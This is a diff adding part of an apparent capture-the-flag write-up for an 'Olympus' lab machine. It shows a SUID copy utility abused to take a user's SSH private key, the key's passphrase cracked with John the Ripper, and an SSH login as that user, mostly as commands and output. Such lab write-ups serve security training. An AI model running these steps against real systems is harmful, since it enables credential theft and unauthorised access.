@@ -260,4 +260,72 @@ www-data@olympus:/var/www/html/chat.olympus.thm$ find / -type f -perm -4000 2>/d
 www-data@olympus:/var$ ls -la /usr/bin/cputils
 -rwsr-xr-x 1 zeus zeus 17728 Apr 18  2022 /usr/bin/cputils
 ```
+```bash
+Error Occurred!www-data@olympus:/var$ /usr/bin/cputils
+  ____ ____        _   _ _     
+ / ___|  _ \ _   _| |_(_) |___ 
+| |   | |_) | | | | __| | / __|
+| |___|  __/| |_| | |_| | \__ \
+ \____|_|    \__,_|\__|_|_|___/
+                               
+Enter the Name of Source File: /home/zeus/.ssh/id_rsa
+
+Enter the Name of Target File: /dev/shm/id_rsa
+
+File copied successfully.
+```
+```bash
+root@ip-10-10-239-74:~# /opt/john/ssh2john.py id_rsa > id_rsa.hash
+
+root@ip-10-10-239-74:~# john id_rsa.hash -w=/usr/share/wordlists/rockyou.txt 
+Note: This format may emit false positives, so it will keep trying even after finding a
+possible candidate.
+Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
+Use the "--format=ssh-opencl" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 16 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+s[.......]e        (id_rsa)
+```
+```
+root@ip-10-10-239-74:~# chmod 600 id_rsa
+root@ip-10-10-239-74:~# ssh zeus@olympus.thm -i id_rsa
+The authenticity of host 'olympus.thm (10.10.156.81)' can't be established.
+ECDSA key fingerprint is SHA256:BqnHMThyqUjFcrDWSnnsynFs5F73vFA3UXh2zTxQDd4.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added 'olympus.thm,10.10.156.81' (ECDSA) to the list of known hosts.
+Enter passphrase for key 'id_rsa': 
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu 09 Mar 2023 01:05:53 PM UTC
+
+  System load:  0.0               Processes:             126
+  Usage of /:   43.6% of 9.78GB   Users logged in:       0
+  Memory usage: 69%               IPv4 address for eth0: 10.10.156.81
+  Swap usage:   0%
+
+ * Super-optimized for small spaces - read how we shrank the memory
+   footprint of MicroK8s to make it the smallest full K8s around.
+
+   https://ubuntu.com/blog/microk8s-memory-optimisation
+
+33 updates can be applied immediately.
+To see these additional updates run: apt list --upgradable
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Sat Jul 16 07:52:39 2022
+zeus@olympus:~$ 
+
+
+```
 
